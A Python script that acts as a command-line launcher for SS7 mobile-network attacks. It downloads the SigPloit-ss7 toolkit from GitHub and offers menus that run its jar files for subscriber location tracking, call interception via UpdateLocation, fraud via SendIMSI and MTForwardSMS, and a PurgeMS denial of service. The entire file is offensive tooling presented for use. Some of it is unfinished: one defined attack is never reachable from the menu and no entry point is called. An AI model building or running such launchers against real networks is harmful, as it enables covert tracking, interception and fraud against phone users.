#!/usr/bin/env python3
import os
import sys
import time
import shutil
import urllib.request
import zipfile
from subprocess import check_call, CalledProcessError

def download_exploits():
    if not os.path.exists("ss7"):
        zip_url = "https://github.com/ethicalhackeragnidhra/SigPloit-ss7/archive/refs/heads/master.zip"
        zip_filename = "SigPloit-ss7.zip"
        urllib.request.urlretrieve(zip_url, zip_filename)
        with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
            zip_ref.extractall(".")
        extracted_folder = "SigPloit-ss7-master"
        src_ss7 = os.path.join(extracted_folder, "ss7")
        if os.path.exists(src_ss7):
            shutil.move(src_ss7, os.path.join(os.getcwd(), "ss7"))
        if os.path.exists(extracted_folder):
            shutil.rmtree(extracted_folder)
        os.remove(zip_filename)

def run_sri():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'tracking', 'sri')
    jar_file = 'SendRoutingInfo.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_psi():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'tracking', 'psi')
    jar_file = 'ProvideSubscriberInfo.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_srism():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'tracking', 'srism')
    jar_file = 'SendRoutingInfoForSM.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_ati():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'tracking', 'ati')
    jar_file = 'AnyTimeInterrogation.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_srigprs():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'tracking', 'srigprs')
    jar_file = 'SendRoutingInfoForGPRS.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_ul():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'interception', 'ul')
    jar_file = 'UpdateLocation.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_simsi():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'fraud', 'simsi')
    jar_file = 'SendIMSI.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_mtsms():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'fraud', 'mtsms')
    jar_file = 'MTForwardSMS.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_cl():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'fraud', 'cl')
    jar_file = 'CancelLocation.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def run_purge():
    path = os.path.join(os.getcwd(), 'ss7', 'attacks', 'dos', 'prgms')
    jar_file = 'PurgeMS.jar'
    return check_call(['java', '-jar', os.path.join(path, jar_file)])

def cli():
    def print_menu(title, options):
        os.system('clear')
        print(f"=== {title} ===")
        for key, desc in options.items():
            print(f"{key}) {desc}")
        print("q) Quit")
    while True:
        main_options = {
            "1": "Location Tracking",
            "2": "Interception",
            "3": "Fraud",
            "4": "DoS",
            "5": "Download Exploits"
        }
        print_menu("Main Menu", main_options)
        choice = input("Your choice: ").strip()
        if choice == "q":
            break
        elif choice == "1":
            lt_options = {
                "1": "SendRoutingInfo",
                "2": "ProvideSubscriberInfo",
                "3": "SendRoutingInfoForSM",
                "4": "AnyTimeInterrogation",
                "5": "SendRoutingInfoForGPRS"
            }
            print_menu("Location Tracking", lt_options)
            sub = input("Your choice: ").strip()
            try:
                if sub == "1":
                    run_sri()
                elif sub == "2":
                    run_psi()
                elif sub == "3":
                    run_srism()
                elif sub == "4":
                    run_ati()
                elif sub == "5":
                    run_srigprs()
            except CalledProcessError as e:
                print("Error:", e)
            input("Press Enter to continue...")
        elif choice == "2":
            print_menu("Interception", {"1": "UpdateLocation"})
            sub = input("Your choice: ").strip()
            try:
                if sub == "1":
                    run_ul()
            except CalledProcessError as e:
                print("Error:", e)
            input("Press Enter to continue...")
        elif choice == "3":
            fraud_options = {
                "1": "SendIMSI",
                "2": "MTForwardSMS"
            }
            print_menu("Fraud", fraud_options)
            sub = input("Your choice: ").strip()
            try:
                if sub == "1":
                    run_simsi()
                elif sub == "2":
                    run_mtsms()
            except CalledProcessError as e:
                print("Error:", e)
            input("Press Enter to continue...")
        elif choice == "4":
            print_menu("DoS", {"1": "PurgeMS"})
            sub = input("Your choice: ").strip()
            try:
                if sub == "1":
                    run_purge()
            except CalledProcessError as e:
                print("Error:", e)
            input("Press Enter to continue...")
        elif choice == "5":
            download_exploits()
            input("Press Enter to continue...")
        else:
            print("Invalid choice!")
            time.sleep(1)

def signal_handler(sig, frame):
    print('\nExiting...')
    time.sleep(1)
    sys.exit(0)